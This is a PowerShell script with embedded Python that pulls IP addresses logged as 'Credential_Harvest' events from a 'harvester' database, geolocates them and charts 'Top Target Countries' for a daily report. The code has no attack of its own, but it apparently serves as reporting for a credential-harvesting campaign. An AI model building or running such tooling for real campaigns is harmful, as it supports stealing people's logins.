# GeoIP Enrichment and Chart Generation Script
# Enriches IPs with GeoIP, generates hit heatmap and bar chart, attaches to daily report.

param(
    [string]$GeoLiteDb = "C:\\GeoLite2-City.mmdb",
    [string]$PythonExe = "python",
    [string]$DailyReportScript = ".\\daily_report.ps1"
)

# 1. Extract IPs from telemetry
$sqlitePath = "C:\\Users\\HomePC\\Downloads\\sqlite-tools-win-x64-3530000\\sqlite3.exe"
$dbPath = ".\\harvester_data.db"
$ips = & $sqlitePath $dbPath "SELECT ip FROM telemetry WHERE event_type = 'Credential_Harvest'"
$ipFile = ".\\ip_list.txt"
$ips | Set-Content $ipFile

# 2. Call Python for GeoIP enrichment and charting
$pyScript = @'
import sys
import geoip2.database
import matplotlib.pyplot as plt
import pandas as pd
from collections import Counter

geoip_db = sys.argv[1]
ip_file = sys.argv[2]
heatmap_file = sys.argv[3]
barchart_file = sys.argv[4]

ips = [line.strip() for line in open(ip_file)]
reader = geoip2.database.Reader(geoip_db)
cities = []
countries = []
for ip in ips:
    try:
        resp = reader.city(ip)
        cities.append(resp.city.name or "Unknown")
        countries.append(resp.country.name or "Unknown")
    except:
        cities.append("Unknown")
        countries.append("Unknown")
reader.close()

# Bar chart: Top countries
country_counts = Counter(countries)
df = pd.DataFrame(country_counts.items(), columns=["Country", "Hits"])
df = df.sort_values("Hits", ascending=False)
df.plot.bar(x="Country", y="Hits", legend=False)
plt.title("Top Target Countries")
plt.tight_layout()
plt.savefig(barchart_file)
plt.close()

# Heatmap: (for simplicity, just a pie chart of countries)
df.plot.pie(y="Hits", labels=df["Country"], autopct='%1.1f%%')
plt.title("Hit Distribution by Country")
plt.ylabel("")
plt.tight_layout()
plt.savefig(heatmap_file)
plt.close()
'@
$pyPath = ".\\geoip_charts.py"
$pyScript | Set-Content $pyPath

$heatmap = ".\\geoip_heatmap.png"
$barchart = ".\\geoip_barchart.png"
& $PythonExe $pyPath $GeoLiteDb $ipFile $heatmap $barchart

# 3. Call daily report script, attaching charts
& $DailyReportScript -ExtraAttachments @($heatmap, $barchart)
